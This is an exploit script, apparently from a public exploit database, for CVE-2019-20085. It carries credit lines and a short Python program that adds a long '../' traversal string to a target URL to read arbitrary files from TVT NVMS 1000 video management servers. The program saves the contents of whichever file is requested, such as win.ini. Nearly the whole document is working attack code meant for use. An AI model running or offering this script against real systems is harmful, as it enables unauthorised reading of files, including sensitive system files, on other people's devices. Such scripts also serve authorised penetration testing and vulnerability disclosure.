# Exploit Title: TVT NVMS 1000 - Directory Traversal 
# Date: 2020-04-13
# Orignal Exploit Author: Mohin Paramasivam (Shad0wQu35t)
# Improved Exploit Author: Tejas Pingulkar
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html
# Original Author : Numan TÃ¼rle
# CVE : CVE-2019-20085

import requests
import os
import time
import sys

if len(sys.argv) != 4:
    print(" ")
    print("Usage : python3 exploit.py url filename outputname")
    print("Example : python3 exploit.py http://10.10.10.10/ windows/win.ini win.ini")
    print("     ")
else:
    traversal = "../../../../../../../../../../../../../"
    filename = sys.argv[2]
    url = sys.argv[1] + traversal + filename
    outputname = sys.argv[3]
    content = requests.get(url)

    if content.status_code == 200:
        print(" ")
        print("Directory Traversal Succeeded")
        time.sleep(3)
        print(" ")
        print("Saving Output")
        with open(outputname, "w") as output_file:
            output_file.write(content.text)
    else:
        print("Host not vulnerable to Directory Traversal!")
